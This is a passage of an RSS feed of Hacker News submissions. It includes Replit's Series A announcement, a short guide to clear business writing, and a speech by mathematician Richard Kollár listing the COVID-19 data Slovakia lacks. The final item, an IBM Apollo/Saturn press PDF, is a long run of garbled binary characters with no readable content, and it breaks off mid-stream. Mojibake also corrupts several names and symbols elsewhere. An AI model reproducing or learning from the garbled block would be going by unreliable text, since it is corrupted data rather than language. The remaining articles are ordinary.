href="https://www.moderntreasury.com/journal/what-happens-when-you-ach-a-dead-person" target="_blank">What Happens When You ACH a Dead Person </a>to learn more about those.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.moderntreasury.com/journal/bad-software-and-expensive-mistakes</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185082</guid>
            <pubDate>Thu, 18 Feb 2021 20:32:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Series A to Revolutionize Computing]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26184594">thread link</a>) | @tosh
<br/>
February 18, 2021 | https://blog.repl.it/seriesa | <a href="https://web.archive.org/web/*/https://blog.repl.it/seriesa">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Our mission is to give everyone in the world <strong>computer superpowers</strong>. We build powerful yet approachable tools &amp; platforms for developers, students, and educators.</p>
<p>We see a new generation of hackers and entrepreneurs rising to seize the power of computers and the internet to create software that empowers them and their communities. They refuse to be programmed by the software priesthood that wants them to endlessly consume ads. Instead, they build a more free society where computers work for and under human users, not the other way around. The world we're describing is coming, and we exist to accelerate the shift. <a href="https://repl.it/careers">Join us</a>! </p>
<p><img src="https://repl.art/replit.png" alt="art"></p>
<p>Replit is a multiplayer computing environment that makes it <a href="https://blog.replit.com/internet-of-fun">fun</a> to learn how to code, build, and <a href="https://repl.it/talk/share">share apps</a> with other people. You can create a cloud-powered computer in milliseconds -- we call them "repls" -- and you can create as many of them as you'd like, all for free. Repls come with storage for your code and files, a <a href="https://blog.repl.it/database">database</a> for your data, and a <a href="https://repl.it/site/multiplayer">multiplayer editor</a> &amp; console to code with your friends. For <a href="https://repl.it/pricing">$7/month</a>, you'll get more powerful machines and, with one-click, make them <a href="https://blog.repl.it/alwayson">run forever</a>.</p>
<p><img src="https://blog.repl.it/images/database/database1.gif" alt="db"></p>
<p>When you invite a friend to your repl, you can see them in your editor and talk to them <a href="https://blog.repl.it/annotations-for-education">right in your code</a>. You can make <a href="https://docs.repl.it/repls/http-servers">web</a>, <a href="https://blog.repl.it/native-graphics-love">desktop</a>, and even command-line apps. Replit takes care of the entire process of <a href="https://docs.repl.it/repls/web-hosting">publishing and hosting apps</a> so you can focus on your ideas.</p>
<p><img src="https://venturebeat.com/wp-content/uploads/2021/02/Live-Code-Editing.gif?resize=800%2C450&amp;strip=all" alt="multiplayer"></p>
<p>When you've built something you want to share, you can share the <a href="https://blog.replit.com/spotlight">repl URL</a>, and your users can play with your app, react to it, comment on it, and even fork and remix it. Replit gives you a profile to keep and showcase all your apps and repls. You can make <a href="https://repl.it/site/teams">shared team profiles</a> for your class, friends, or company to collaborate on repls.</p>
<p><img src="https://blog.repl.it/images/spotlight/ios-demo.gif" alt="share"></p>
<p>Because you can make a repl in milliseconds, Replit makes it fun and safe to experiment with ideas. Learning comes naturally as a side effect of playing in the Replit ecosystem.</p>
<p>Millions of people have learned how to code with Replit and built great apps with thousands of happy users. Some have even built businesses and become rich &amp; famous.</p>
<p>Replit's design principles:</p>
<ul>
<li><p><strong>Learnable yet scalable interfaces</strong>: Interfaces today present the same UI to vastly different users, from children to adults, from novices to experts. Our mission demands that we make computing environments more accessible to novices while making it possible to transition to more powerful interfaces. Replit starts with a simple editor and console, which gets learners very far. The UI, however, is adaptable and presents different faces to different users and use-cases.</p>
</li>
<li><p><strong>Infrastructure as legos</strong>: A core part of commanding computer power is to be able to build for the modern internet-connected world. Despite progress in cloud computing, infrastructure remains inaccessible to novices, hobbyists, and educators. We change this by designing simple and scalable components, like cloud-hosted servers accessible right from the repl, storage, databases, etc., that require little configuration and maintenance by the programmer. Coders can then mix and match components to create endless possibilities.</p>
</li>
<li><p><strong>People-centric technology</strong>: It's more exciting and fun to create and learn with other people. The future demands that computers and the internet have human interconnectedness as a core primitive. From our multiplayer computing protocol to our community spaces for sharing software, we build support for human beings, and we put collaboration right at the heart of our technology.</p>
</li>
</ul>
<h2 id="series-a">Series A</h2>
<p>As a team, we've always thought about the long-term, and we've grown Replit responsibly. We have so much conviction in our mission and our plan that we're willing to take our time. </p>
<p>Last year, with rapid growth in all aspects of our business, we felt it was a good time to raise a sizeable round to make faster progress our mission. We raised <a href="https://venturebeat.com/2021/02/18/replit-raises-20-million-for-collaborative-browser-based-coding/">$20M in Series A</a> financing led by <a href="https://acapital.com/">A.Capital</a> with strong participation from our seed investors: Andreessen Horowitz, Bloomberg Beta, Y Combinator, and Reach Capital. </p>
<p>Since then, thanks to the new capital and to <a href="https://amasad.me/moad">Engelbartian Bootstrapping</a>, we've accelerated feature development, and there's so much more on the horizon: extra resources for more complex projects, support for any language or package, further dev ops simplifications for novices and pros, business collaboration features, improvements to <a href="https://repl.it/teams-for-education">teacher workflows</a>, high quality content, a game development library, and more breakthroughs in collaborative coding. We're excited to see all the amazing things you build with the tools we provide!</p>
<p>Finally, we're hiring for multiple roles and want to bring on people who share our vision and passion. If you're interested in making computing more accessible while working with a creative and hardworking team building fantastic technology, <a href="https://repl.it/careers">join us</a>!</p>

	</div></div>]]>
            </description>
            <link>https://blog.repl.it/seriesa</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184594</guid>
            <pubDate>Thu, 18 Feb 2021 19:53:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pocket Guide: Business Writing for Startup Founders]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26184367">thread link</a>) | @qnd
<br/>
February 18, 2021 | https://www.artlapinsch.com/writing-for-founders/ | <a href="https://web.archive.org/web/*/https://www.artlapinsch.com/writing-for-founders/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>Clear writing is important. </p><p>Especially if you are running a company.</p><ul><li>It is faster to read</li><li>It leaves no room for confusion</li><li>It makes the next steps obvious</li></ul><hr><p>To write more clearly, apply the following:</p><h2 id="active-speech">Active Speech</h2><p>Don't write <em>"the report was prepared by our sales lead."</em></p><p>Instead, write <em>"Our sales lead prepared the report."</em></p><h2 id="no-redundancies">No Redundancies</h2><p>Don't write <em>"the successful campaign had positive results."</em></p><p>Instead, write <em>"the campaign was successful."</em></p><h2 id="specificity">Specificity</h2><p>Don't write <em>"we processed a lot of requests in the past few weeks."</em></p><p>Instead write, <em>"from 2/12/2020 - 3/11/2020 we processed 500+ requests."</em></p><h2 id="structure">Structure</h2><p>Don't write without a structure.</p><p>Instead, pick a structure <em>(bullets; headlines; etc.)</em> and stick with it.</p><h2 id="narrative">Narrative</h2><p>Don't go from A to Z to B to D.</p><p>Instead, go from A to B to C <em>(beginning, middle, end)</em>.</p><h2 id="next-steps">Next Steps</h2><p>Don't leave next steps open for interpretation. </p><p>Instead, communicate who <em>(owner)</em>, will do what<em> (task)</em>, and by when <em>(ETA)</em>.</p><hr><p>Save time. Show direction. Trigger action.</p><p>Write clearly. </p><hr><p><em>Someone helped me with these tips many years ago. I hope it helps you.</em></p><p><em>If you have feedback, thoughts, or want to get in touch, ping me on <a href="https://twitter.com/artlapinsch">twitter</a>.</em></p><!--kg-card-begin: html--><!-- Begin Mailchimp Signup Form -->




<!--End mc_embed_signup--><!--kg-card-end: html--><hr><h3 id="further-reading">Further Reading</h3><ul><li><strong><a href="https://www.google.com/search?client=safari&amp;rls=en&amp;q=the+day+you+became+a+better+writer+scott+adams&amp;ie=UTF-8&amp;oe=UTF-8">The Day You Became a Better Write</a></strong> <em>(Scott Adams)</em></li><li><strong><a href="https://www.artlapinsch.com/writing-guide/">A Guide to Better Writing</a></strong> <em>(Art Lapinsch) </em>üëà<em> </em>This is an in-depth guide with 35 of my favorite resources on writing</li></ul>
                <section>
                  
                  <ul>
                      <li>
                        <a href="https://www.artlapinsch.com/tag/guide/" title="guide">guide</a>
                      </li>
                  </ul>
                </section>
            </div></div>]]>
            </description>
            <link>https://www.artlapinsch.com/writing-for-founders/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184367</guid>
            <pubDate>Thu, 18 Feb 2021 19:32:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coronavirus in Slovakia: What Is Going On]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26184366">thread link</a>) | @scandox
<br/>
February 18, 2021 | https://spectator.sme.sk/c/22598901/coronavirus-in-slovakia-what-is-going-on.html | <a href="https://web.archive.org/web/*/https://spectator.sme.sk/c/22598901/coronavirus-in-slovakia-what-is-going-on.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The answer is just three words.</p><div><p><a href="https://m.smedata.sk/api-media/media/image/spectator/9/68/6821849/6821849_1200x.jpeg?rev=3"><img alt="Mathematician Richard Koll√°r during the press conference in the Presidential Palace on February 16, 2021. " src="https://m.smedata.sk/api-media/media/image/spectator/9/68/6821849/6821849_600x400.jpeg?rev=3"><span><span><svg width="30px" height="30px"><use xlink:href="#svg-icon-magnifier"></use></svg><span></span></span></span></a><span><small>Mathematician Richard Koll√°r during the press conference in the Presidential Palace on February 16, 2021.  (Source: TASR)</small></span></p></div><article data-article-stats-id="22598901" id="js-article" data-user-login-url="https://prihlasenie.sme.sk"><p><span data-deep-event-tags="position-top"><span><span title="p√¥vodn√° veƒækos≈• p√≠sma">Font size:</span><span title="zmen≈°i≈• p√≠smo"><span data-ga-event-id="gaev-art-toolbox" data-ga-event-category="article_toolbox_top" data-ga-event-action="fontminus">A</span><sup>-</sup></span>|<span title="zv√§ƒç≈°i≈• p√≠smo"><span data-ga-event-id="gaev-art-toolbox" data-ga-event-category="article_toolbox_top" data-ga-event-action="fontplus">A</span><sup>+</sup></span></span></span></p>
<p><em>Richard Koll√°r is a mathematician. He delivered this speech during the press conference after a meeting of scientists with President Zuzana ƒåaputov√° on February 16, 2021. </em></p><p>I am a mathematician and I will speak exclusively about numbers and data. I will answer one question, often posed by journalists and the wider public - how we are doing and what is going on regarding the pandemic in Slovakia.</p><p>The answer is very simple. Just three words.</p><p>We don't know. We don't know, in fact.</p><p>I will try to sum up all the things we do not know.</p><p>We are missing absolutely key data to be able to assess the effects of our measures, and the epidemiological situation we are in.</p><p>We have no clue how many people are arriving to hospitals as new patients, we have no clue how many are leaving the hospitals. We therefore cannot say what is causing the increase in the number of hospitalisations we are seeing.</p><p>We don't know that about ventilators either, because the numbers we have do not match. When you put the arrivals and the departures in an equation, you do not get the number we have got now.</p><p>We don't know the age of the hospital patients, so we don't know what's going on.</p><p>We don't know how many infections are hospital-acquired.</p><p>We don't know how many patients are transferred from Covid to non-Covid wards in hospitals.</p><p>We don't know what is the structure of the tests we are performing.</p><p>We don't now how many tests have been done per health indication in hospitals, how many were indicated by epidemiologists or self-indicated.</p><p>We don't know how many tests were part of screening.</p><p>We don't know how many tests are performed in hospitals and what are their results.</p><p>We have no information about tracing.</p><p>We don't now exactly how many people have been traced and how many have been indicated as positive. We don't know how many of the people who were found through tracing ended up in hospitals.</p><p>We don't know what the effectiveness of our tracing is.</p><p>We don't know where the problem lies.</p><p>We don't know about the new variants. We probably have the best tests in Europe to find that out. We are the only country with tests for the British strain. Yet we still don't know how its prevalence developed in the Slovak samples in January. We have looked at one day's sample, but we have no clue how it developed in time. Even though there have been promises and interest in doing that, we still do not have that data.</p><p>We haven't learned from the regional public health offices where Slovak citizens become infected.</p><p>We don't know if it is safe to go to the store. We don't know if it is safe to travel by public transport.</p><p>We don't know how many people got infected where and we do not report such numbers.</p><p>We don't know how the opening of schools last week went, and how many have been closed.</p><p>We don't know how many people have passed through the border crossings and we don't know which countries they came from; how many then end up positive and hospitalised.</p><p>As for the tests proposed by the Education Ministry, we don't know how they have been validated and what are their parametres. We know they are being purchased, but we don't have a clue what they will look like.</p><p>When we apply  theCovid automat, we don't know how its parametres are assessed. We cannot assess the incidence because the numbers of PCR and antigen tests are counted together. PCR tests are reported based on the person's permanent residence, antigen tests are reported based on the testing site location.</p><p>We don't know how things stand with hospitalisations.</p><p>We have no idea how to calculate the reproduction number, which is why we don't dare to announce it during press conferences.</p><p>We have no clue how these three parametres are combined and evaluated on the level of districts.</p><p>We don't know why some districts have the colour they have.</p><p>We don't know why the Health Ministry laid off 10 percent of its staff as part of the corona-crisis measures just like other ministries, and why they have not reinforced the analytical units.</p><p>We are in a data hell. And we don't know if we are facing another wave; if it will be stronger than the one we are going through, or milder.</p><p>We don't know if we are facing the same fate as the Czech city of Cheb, where a quarter of a percent of its inhabitants have died in the past five weeks. Perhaps Slovakia is facing the same.</p><p>We don't know, we have no way of knowing what is going on.</p><p>
            17. Feb 2021 at 13:15
        &nbsp;|&nbsp;Richard Koll√°r
    
    </p></article></div>]]>
            </description>
            <link>https://spectator.sme.sk/c/22598901/coronavirus-in-slovakia-what-is-going-on.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184366</guid>
            <pubDate>Thu, 18 Feb 2021 19:31:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IBM Apollo/Saturn Press Information [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26184346">thread link</a>) | @Felonius_Monk
<br/>
February 18, 2021 | https://www.apollopresskits.com/cs/c/?cta_guid=69bda2b0-603b-4c91-bf30-c3d425396f31&signature=AAH58kE89ooPCBnAEHIF6NwUgRUo-tIeiA&pageId=7962764933&placement_guid=00362abe-1f60-422e-99aa-75f5e9edf2e9&click=76a4887d-6ed6-41ad-8f35-f49bfbfb5ef6&hsutk=c7a00000190d1bd81cf30177b699595f&canon=https%3A%2F%2Fwww.apollopresskits.com%2Fapollo-presskit-directory&utm_referrer=https%3A%2F%2Fpinboard.in%2Fu%3Amichaelcolenso%2Fbefore%3A1569472943&portal_id=413105&redirect_url=APefjpE9rO6ok2BaATb973oLgLwidfs4zRYwQVkhov4aq3jijtJU9oC3_MkthEIQajAD2N7OYtegEpDri0ocRWxVVLga-zgB54CWPGlhDPe5Hs7yGVQ4i-Bg8al-HsINkLxHD7A5NZMRQuOTY2HFAYJ1b50AuY62q-AzqiHpeVCtj-WgsQyex1s | <a href="https://web.archive.org/web/*/https://www.apollopresskits.com/cs/c/?cta_guid=69bda2b0-603b-4c91-bf30-c3d425396f31&signature=AAH58kE89ooPCBnAEHIF6NwUgRUo-tIeiA&pageId=7962764933&placement_guid=00362abe-1f60-422e-99aa-75f5e9edf2e9&click=76a4887d-6ed6-41ad-8f35-f49bfbfb5ef6&hsutk=c7a00000190d1bd81cf30177b699595f&canon=https%3A%2F%2Fwww.apollopresskits.com%2Fapollo-presskit-directory&utm_referrer=https%3A%2F%2Fpinboard.in%2Fu%3Amichaelcolenso%2Fbefore%3A1569472943&portal_id=413105&redirect_url=APefjpE9rO6ok2BaATb973oLgLwidfs4zRYwQVkhov4aq3jijtJU9oC3_MkthEIQajAD2N7OYtegEpDri0ocRWxVVLga-zgB54CWPGlhDPe5Hs7yGVQ4i-Bg8al-HsINkLxHD7A5NZMRQuOTY2HFAYJ1b50AuY62q-AzqiHpeVCtj-WgsQyex1s">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>&gt;&gt;'&gt;7&gt;G&gt;W&gt;g&gt;w&gt;‚Ä°&gt;‚Äî&gt;¬ß&gt;¬∑&gt;√á&gt;√ó&gt;√ß&gt;√∑???'?7?G?W?g?x?ÀÜ?Àú?¬®?¬∏?√à?√ô?√©?√π@	@@*@:@J@Z@k@{@‚Äπ@≈ì@¬¨@¬º@√ç@√ù@√≠@√æAAA/A?AOA`ApAÔøΩA‚ÄòA¬¢A¬≤A√ÉA√ìA√§A√¥BBB&amp;B6BGBWBhBxB‚Ä∞B≈°B¬™B¬ªB√ãB√úB√≠B√ΩCCC/C@CQCaCrC∆íC‚ÄùC¬§C¬µC√ÜC√óC√ßC√∏D	DD+D;DLD]DnDDÔøΩD¬°D¬≤D√ÇD√ìD√§D√µEEE(E9EJE[ElE}E≈ΩE≈∏E¬∞E√ÅE√íE√£E√¥FFF(F9FJF[FlF}FÔøΩF&nbsp;F¬±F√ÇF√ìF√§F√∂GGG)G;GLG]GnG‚Ç¨G‚ÄòG¬¢G¬¥G√ÖG√ñG√®G√πH
HH-H?HPHaHsH‚ÄûH‚ÄìH¬ßH¬πH√äH√úH√≠H√øII"I3IEIVIhIzI‚ÄπIÔøΩI¬ÆI√ÄI√íI√£I√µJJJ*J;JMJ_JqJ‚ÄöJ‚ÄùJ¬¶J¬∑J√âJ√õJ√≠J√øKK"K4KFKXKiK{KÔøΩK≈∏K¬±K√ÉK√ïK√ßK√πL
LL.L@LRLdLvLÀÜL≈°L¬¨L¬æL√êL√¢L√¥MMM+M=MOMaMsM‚Ä¶M‚ÄîM¬©M¬ºM√éM√†M√≤NNN)N;NMN_NrN‚ÄûN‚ÄìN¬©N¬ªN√çN√üN√≤OOO)O;ONO`OrO‚Ä¶O‚ÄîO¬™O¬ºO√éO√°O√≥PPP+P=PPPbPuP‚Ä°P≈°P¬≠P¬øP√íP√§P√∑Q	QQ/QAQTQgQyQ≈íQ≈∏Q¬±Q√ÑQ√óQ√©Q√ºRR"R4RGRZRmR‚Ç¨R‚ÄôR¬•R¬∏R√ãR√ûR√±SSS)S<sosbsusÀÜs‚Ä∫s¬Æs√Ås√îs√ßs√∫t t="" t3tftytltt‚Äôt¬•t¬∏t√ãt√ût√≤uuu+u="">UQUeUxU‚ÄπU≈æU¬±U√ÖU√òU√´U√æVV%V8VKV_VrV‚Ä¶V‚Ñ¢V¬¨V¬øV√ìV√¶V√∫W
W W4WGW[WnW‚ÄöW‚Ä¢W¬©W¬ºW√êW√£W√∑X
XX1XEXXXlX‚Ç¨X‚ÄúX¬ßX¬∫X√éX√¢X√µY	YY0YDYXYkYY‚ÄúY¬ßY¬∫Y√éY√¢Y√∂Z	ZZ1ZEZYZlZ‚Ç¨Z‚ÄùZ¬®Z¬ºZ√êZ√§Z√∏[[[3[G[[[o[∆í[‚Äî[¬´[¬ø[√ì[√ß[√ª\\#\7\K\`\t\ÀÜ\≈ì\¬∞\√Ñ\√ò\√¨]]])]=]Q]e]z]≈Ω]¬¢]¬∂]√ã]√ü]√≥^^^0^D^Y^m^‚Äö^‚Äì^¬™^¬ø^√ì^√ß^√º__%_9_N_b_w_‚Äπ_&nbsp;_¬¥_√â_√ù_√≤```/`D`X`m`‚Äö`‚Äì`¬´`¬ø`√î`√©`√Ωaa'a;aPaeaza≈Ωa¬£a¬∏a√ça√°a√∂bb b5bIb^bsbÀÜbÔøΩb¬≤b√áb√õb√∞ccc/cDcYcnc∆ícÀúc¬≠c√Çc√óc√¨ddd+d@dUdjdd‚Ä¢d¬™d¬ød√îd√©d√æee)e&gt;eSehe}e‚Äúe¬®e¬Ωe√íe√®e√Ωff'f=fRfgf}f‚Äôf¬ßf¬Ωf√íf√®f√Ωgg(g=gSghg~g‚Äúg¬©g¬æg√îg√©g√øhh*h?hUhjh‚Ç¨h‚Äìh¬´h√Åh√ñh√¨iii-iCiXini‚Äûi‚Ñ¢i¬Øi√Öi√õi√∞jjj2jHj]jsj‚Ä∞j≈∏j¬µj√äj√†j√∂kk"k8kNkdkzkÔøΩk¬¶k¬ºk√ík√®k√æll*l@lVlll‚ÄölÀúl¬Æl√Ñl√öl√∞mmm3mIm_mum‚Äπm¬°m¬∏m√ém√§m√∫nn'n=nSnjn‚Ç¨n‚Äìn¬≠n√Én√ôn√∞ooo3oIo`ovo≈ío¬£o¬πo√êo√¶o√Ωpp*p@pWpmp‚Äûp≈°p¬±p√áp√ûp√¥qq"q8qOqfq|q‚Äúq¬™q√Äq√óq√Ærrr2rHr_rvrÔøΩr¬§r¬∫r√ër√®r√øss,sCsZsqsÀÜs≈∏s¬∂s√çs√§s√∫tt(t?tVtmt‚Äût‚Ä∫t¬≤t√ât√†t√∑uu&amp;u=uTuku‚Äöu‚Ñ¢u¬∞u√áu√ûu√∂v
v$v;vRvjvÔøΩvÀúv¬Øv√áv√ûv√µww$w;wRwjwÔøΩwÀúw¬∞w√áw√ûw√∂x
x%x<xtxkx‚Äöx≈°x¬±x√âx√†x√∏yy'y>yVyny‚Ä¶yÔøΩy¬¥y√åy√£y√ªzz*zBzZzqz‚Ä∞z¬°z¬∏z√êz√®{{{/{G{_{v{≈Ω{¬¶{¬æ{√ñ{√Æ|||5|M|e|}|‚Ä¢|¬≠|√Ö|√ú|√¥}}$}&lt;}T}l}‚Äû}≈ì}¬¥}√ç}√•}√Ω~~-~E~]~u~ÔøΩ~¬•~¬æ~√ñ~√Æ7Og‚Äî¬∞√à√†√π‚Ç¨‚Ç¨)‚Ç¨A‚Ç¨Z‚Ç¨r‚Ç¨≈†‚Ç¨¬£‚Ç¨¬ª‚Ç¨√î‚Ç¨√¨ÔøΩÔøΩÔøΩ5ÔøΩNÔøΩfÔøΩÔøΩ‚ÄîÔøΩ¬∞ÔøΩ√àÔøΩ√°ÔøΩ√π‚Äö‚Äö*‚ÄöC‚Äö[‚Äöt‚Äö≈í‚Äö¬•‚Äö¬æ‚Äö√ñ‚Äö√Ø∆í∆í ∆í9∆íQ∆íj∆í∆í∆í‚Ä∫∆í¬¥∆í√ç∆í√•∆í√æ‚Äû‚Äû0‚ÄûH‚Äûa‚Äûz‚Äû‚Äú‚Äû¬¨‚Äû√Ñ‚Äû√ù‚Äû√∂‚Ä¶‚Ä¶(‚Ä¶A‚Ä¶Z‚Ä¶r‚Ä¶‚Äπ‚Ä¶¬§‚Ä¶¬Ω‚Ä¶√ñ‚Ä¶√Ø‚Ä†‚Ä†!‚Ä†:‚Ä†S‚Ä†l‚Ä†‚Ä¶‚Ä†≈æ‚Ä†¬∑‚Ä†√ê‚Ä†√©‚Ä°‚Ä°‚Ä°4‚Ä°M‚Ä°g‚Ä°‚Ç¨‚Ä°‚Ñ¢‚Ä°¬≤‚Ä°√ã‚Ä°√§‚Ä°√ΩÀÜÀÜ0ÀÜIÀÜbÀÜ{ÀÜ‚Ä¢ÀÜ¬ÆÀÜ√áÀÜ√†ÀÜ√∫‚Ä∞‚Ä∞,‚Ä∞F‚Ä∞_‚Ä∞x‚Ä∞‚Äò‚Ä∞¬´‚Ä∞√Ñ‚Ä∞√û‚Ä∞√∑≈†≈†*≈†C≈†]≈†v≈†ÔøΩ≈†¬©≈†√Ç≈†√ú≈†√µ‚Äπ‚Äπ(‚ÄπB‚Äπ[‚Äπu‚Äπ≈Ω‚Äπ¬®‚Äπ√Ç‚Äπ√õ‚Äπ√µ≈í≈í(≈íB≈í[≈íu≈íÔøΩ≈í¬®≈í√Ç≈í√ú≈í√µÔøΩÔøΩ)ÔøΩBÔøΩ\ÔøΩvÔøΩÔøΩÔøΩ¬©ÔøΩ√ÉÔøΩ√ùÔøΩ√∑≈Ω≈Ω+≈ΩD≈Ω^≈Ωx≈Ω‚Äô≈Ω¬¨≈Ω√Ü≈Ω√†≈Ω√∫ÔøΩÔøΩ-ÔøΩGÔøΩaÔøΩ{ÔøΩ‚Ä¢ÔøΩ¬ØÔøΩ√âÔøΩ√£ÔøΩ√ΩÔøΩÔøΩ1ÔøΩKÔøΩeÔøΩÔøΩ≈°ÔøΩ¬¥ÔøΩ√éÔøΩ√®‚Äò‚Äò‚Äò6‚ÄòP‚Äòk‚Äò‚Ä¶‚Äò≈∏‚Äò¬π‚Äò√ì‚Äò√Æ‚Äô‚Äô"‚Äô&lt;‚ÄôW‚Äôq‚Äô‚Äπ‚Äô¬¶‚Äô√Ä‚Äô√ö‚Äô√¥‚Äú‚Äú)‚ÄúD‚Äú^‚Äúx‚Äú‚Äú‚Äú¬≠‚Äú√à‚Äú√¢‚Äú√º‚Äù‚Äù1‚ÄùL‚Äùf‚ÄùÔøΩ‚Äù‚Ä∫‚Äù¬∂‚Äù√ê‚Äù√´‚Ä¢‚Ä¢ ‚Ä¢;‚Ä¢U‚Ä¢p‚Ä¢≈†‚Ä¢¬•‚Ä¢√Ä‚Ä¢√ö‚Ä¢√µ‚Äì‚Äì*‚ÄìE‚Äì_‚Äìz‚Äì‚Ä¢‚Äì¬∞‚Äì√ä‚Äì√•‚Äî‚Äî‚Äî5‚ÄîP‚Äîk‚Äî‚Ä†‚Äî¬°‚Äî¬ª‚Äî√ñ‚Äî√±ÀúÀú'ÀúBÀú]ÀúwÀú‚ÄôÀú¬≠Àú√àÀú√£Àú√æ‚Ñ¢‚Ñ¢4‚Ñ¢O‚Ñ¢j‚Ñ¢‚Ä¶‚Ñ¢&nbsp;‚Ñ¢¬ª‚Ñ¢√ñ‚Ñ¢√±≈°≈°'≈°B≈°^≈°y≈°‚Äù≈°¬Ø≈°√ä≈°√•‚Ä∫‚Ä∫‚Ä∫7‚Ä∫R‚Ä∫m‚Ä∫ÀÜ‚Ä∫¬§‚Ä∫¬ø‚Ä∫√ö‚Ä∫√µ≈ì≈ì,≈ìG≈ìc≈ì~≈ì‚Ñ¢≈ì¬µ≈ì√ê≈ì√´ÔøΩÔøΩ"ÔøΩ=ÔøΩYÔøΩtÔøΩÔøΩÔøΩ¬´ÔøΩ√ÜÔøΩ√¢ÔøΩ√Ω≈æ≈æ4≈æP≈æk≈æ‚Ä°≈æ¬¢≈æ¬æ≈æ√ö≈æ√µ≈∏≈∏,≈∏H≈∏c≈∏≈∏‚Ä∫≈∏¬∂≈∏√í≈∏√Æ&nbsp;	&nbsp;%&nbsp;A&nbsp;\&nbsp;x&nbsp;‚Äù&nbsp;¬∞&nbsp;√ã&nbsp;√ß¬°¬°¬°:¬°V¬°r¬°≈Ω¬°¬™¬°√Ü¬°√°¬°√Ω¬¢¬¢5¬¢Q¬¢m¬¢‚Ä∞¬¢¬•¬¢√Å¬¢√ù¬¢√π¬£¬£1¬£M¬£i¬£‚Ä¶¬£¬°¬£¬Ω¬£√ô¬£√µ¬§¬§-¬§I¬§e¬§ÔøΩ¬§≈æ¬§¬∫¬§√ñ¬§√≤¬•¬•*¬•G¬•c¬•¬•‚Ä∫¬•¬∏¬•√î¬•√∞¬¶¬¶)¬¶E¬¶a¬¶~¬¶≈°¬¶¬∂¬¶√ì¬¶√Ø¬ß¬ß(¬ßD¬ß`¬ß}¬ß‚Ñ¢¬ß¬∂¬ß√í¬ß√Ø¬®¬®(¬®D¬®a¬®}¬®≈°¬®¬∂¬®√ì¬®√Ø¬©¬©)¬©E¬©b¬©~¬©‚Ä∫¬©¬∏¬©√î¬©√±¬™¬™*¬™G¬™d¬™‚Ç¨¬™ÔøΩ¬™¬∫¬™√ó¬™√≥¬´¬´-¬´J¬´g¬´∆í¬´&nbsp;¬´¬Ω¬´√ö¬´√∑¬¨¬¨0¬¨M¬¨j¬¨‚Ä°¬¨¬§¬¨√Å¬¨√û¬¨√ª¬≠¬≠5¬≠R¬≠o¬≠≈í¬≠¬©¬≠√Ü¬≠√£¬Æ¬Æ¬Æ:¬ÆW¬Æt¬Æ‚Äô¬Æ¬Ø¬Æ√å¬Æ√©¬Ø¬Ø#¬Ø@¬Ø^¬Ø{¬ØÀú¬Ø¬µ¬Ø√ì¬Ø√∞¬∞
¬∞*¬∞H¬∞e¬∞‚Äö¬∞≈∏¬∞¬Ω¬∞√ö¬∞√∑¬±¬±2¬±P¬±m¬±≈†¬±¬®¬±√Ö¬±√£¬≤¬≤¬≤;¬≤Y¬≤v¬≤‚Äù¬≤¬±¬≤√è¬≤√¨¬≥
¬≥'¬≥E¬≥b¬≥‚Ç¨¬≥≈æ¬≥¬ª¬≥√ô¬≥√∂¬¥¬¥2¬¥O¬¥m¬¥‚Äπ¬¥¬®¬¥√Ü¬¥√§¬µ¬µ¬µ=¬µ[¬µy¬µ‚Äì¬µ¬¥¬µ√í¬µ√∞¬∂¬∂,¬∂I¬∂g¬∂‚Ä¶¬∂¬£¬∂√Å¬∂√ü¬∂√Ω¬∑¬∑9¬∑W¬∑u¬∑‚Äú¬∑¬±¬∑√è¬∑√≠¬∏¬∏)¬∏G¬∏e¬∏∆í¬∏¬°¬∏¬ø¬∏√ù¬∏√ª¬π¬π8¬πV¬πt¬π‚Äô¬π¬∞¬π√é¬π√≠¬∫¬∫)¬∫G¬∫f¬∫‚Äû¬∫¬¢¬∫√Ä¬∫√ü¬∫√Ω¬ª¬ª:¬ªX¬ªv¬ª‚Ä¢¬ª¬≥¬ª√ë¬ª√∞¬º¬º-¬ºK¬ºj¬ºÀÜ¬º¬¶¬º√Ö¬º√£¬Ω¬Ω ¬Ω?¬Ω]¬Ω|¬Ω‚Ä∫¬Ω¬π¬Ω√ò¬Ω√∂¬æ¬æ3¬æR¬æq¬æÔøΩ¬æ¬Æ¬æ√ç¬æ√´¬ø
¬ø)¬øG¬øf¬ø‚Ä¶¬ø¬§¬ø√Ç¬ø√°√Ä√Ä√Ä&gt;√Ä\√Ä{√Ä≈°√Ä¬π√Ä√ò√Ä√∑√Å√Å4√ÅS√År√Å‚Äò√Å¬∞√Å√è√Å√Æ√Ç
